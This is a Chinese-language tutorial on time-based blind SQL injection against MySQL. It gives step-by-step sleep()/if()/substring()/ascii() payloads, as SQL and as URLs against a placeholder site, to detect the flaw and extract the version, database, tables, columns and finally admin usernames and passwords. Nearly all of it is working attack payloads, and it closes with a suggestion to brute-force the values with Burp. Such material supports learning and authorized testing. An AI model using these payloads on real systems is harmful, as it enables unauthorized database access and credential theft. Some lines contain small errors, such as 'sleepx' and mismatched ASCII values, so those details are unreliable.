

延时注入属于盲注入的一种，这种注入通过mysql里面的sleep()函数,这个函数的意思是延时执行多少秒。

sleep通常与 if一起使用

```sql
select if('root'='root',sleep(3),0) 
```

如果 字符串root等于root 数据库延时3秒 否则输出0

延时方法是先获取数据的长度

```sql
select if(LENGTH(version())=6,sleep(3),0)
```

再查询数据，这就是我们常用的一些字符 把他们转为ASCII码方便进行对比。

```
abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_. 
```

字符串截取长度：substring()

```sql
select if (substring(select version(),1,1),sleep(5),0)
select substring(version(),1,1)
```

字符转ascii码：ascii() 

```sql
select if (ascii(substring(version(),1,1))=54,sleep(5),0)
```

## 1、判断注入

and 1=1
and 1=2

and sleep(5)#
and sleep(5)--
and sleep(5) 

这种方法判断注入，如果存在注入的情况下 页面是延时5秒 返回页面。

## 2、获取mysql版本

先判断mysql的版本长度 ，当and if(LENGTH(version())=x,sleepx(3),0) 当长度到6的时候，页面延时3秒返回。

```http
http://target_sys.com/mysqlinj.php?id=1 and if(LENGTH(version())=6,sleep(3),0)
```

当知道长度了 就可以用查询数据。

查询数据的语句为  5 的 ascii 为53 延时5秒

```sql
select if(ascii(substring((select version()),1,1))=53,sleep(5),0)
select if(ascii(substring((select version()),2,1))=46,sleep(5),0)
select if(ascii(substring((select version()),3,1))=53,sleep(5),0)
select if(ascii(substring((select version()),4,1))=46,sleep(5),0)
select if(ascii(substring((select version()),5,1))=52,sleep(5),0)
select if(ascii(substring((select version()),6,1))=54,sleep(5),0)
```

以上是mysql里面的用语句判断1到六每个字符的长度分别是 53  46 53 46 52 54 ascii转成字符就是 5.5.46

放在网站上的测试语句就是 第一个数组ascii码53 转换 字符 就是 5 

```http
http://target_sys.com/mysqlinj.php?id=1 and if(ascii(substring((select version()),1,1))=53,sleep(5),0)
```

## 3、获取库名

获取库名也是同样的语句只是把查询的内容改变一个 查询库 select database() -> target_sys

在延时注入里，语句是这样的 长度为10

```http
http://target_sys.com/mysqlinj.php?id=1 and if(LENGTH(database())=10,sleep(3),0)
```

长度已经确认，查询库名。第一个字符的ascii为116 转码字符 t 如此类推到第十。

```sql
select if(ascii(substring((select database()),1,1))=116,sleep(5),0)
```

测试网站的语句 为 延时5秒 返回页面

```http
http://target_sys.com/mysqlinj.php?id=1 and if(ascii(substring((select database()),1,1))=116,sleep(5),0)
```

## 4、获取表

查询所有表的长度 长度为30

```sql
select if(LENGTH((select(group_concat(TABLE_NAME)) from information_schema.TABLES where TABLE_SCHEMA=database()))=30,sleep(5),0)
```

测试网站语句

```http
http://target_sys.com/mysqlinj.php?id=1 and if(LENGTH((select(group_concat(TABLE_NAME)) from information_schema.TABLES where TABLE_SCHEMA=database()))=30,sleep(5),0)
```

查询所有表 第一个字符为97 ascii为a 查询到40

```sql
select if(ascii(SUBSTRING((select group_concat(TABLE_NAME)from information_schema.TABLES where TABLE_SCHEMA=database()),1,1))=97,sleep(5),0)
```

网址语句

```http
http://target_sys.com/mysqlinj.php?id=1 and if(ascii(SUBSTRING((select group_concat(TABLE_NAME)from information_schema.TABLES where TABLE_SCHEMA=database()),1,1))=97,sleep(5),0)
```

## 5、查询字段

查询admin表的字段 把admin转换成十六进制 0x61646d696e 带入语句

首先确认长度 

```sql
select if(LENGTH((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=0x61646d696e))=20,sleep(5),0)
```

测试语句

```http
http://target_sys.com/mysqlinj.php?id=1 and if(LENGTH((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=0x61646d696e))=20,sleep(5),0)
```

查询数据 

```sql
select if(ascii(SUBSTRING((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=0x61646d696e),1,1))=105,sleep(5),0)
```

测试语句 直接查询到20个字符长度

```http
http://target_sys.com/mysqlinj.php?id=1 and if(ascii(SUBSTRING((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=0x61646d696e),1,1))=105,sleep(5),0)
```

## 6、查询内容

确定数据长度 38 

```sql
select if(LENGTH((select GROUP_CONCAT(username,0x3a,password)from admin))=38,sleep(5),5)
```

网址测试语句

```http
http://target_sys.com/mysqlinj.php?id=1 and if(LENGTH((select GROUP_CONCAT(username,0x3a,password)from admin))=38,sleep(5),5)
```

查询数据内容 查询第一个

```sql
select if(ascii(substring((select GROUP_CONCAT(username,0x3a,password)from admin),1,1))=105,sleep(5),5)
```

网址语句 测试第一个字符为ascii为97 字符为a 

```http
http://target_sys.com/mysqlinj.php?id=1 and if(ascii(substring((select GROUP_CONCAT(username,0x3a,password)from admin),1,1))=97,sleep(5),0)
```

原理大致上就是这样 先用语句测试数据长度,再用长度查询内容。

网站测试时，可以通过burp爆出对应的ascii值，然后再查询内容并组合得到想要的数据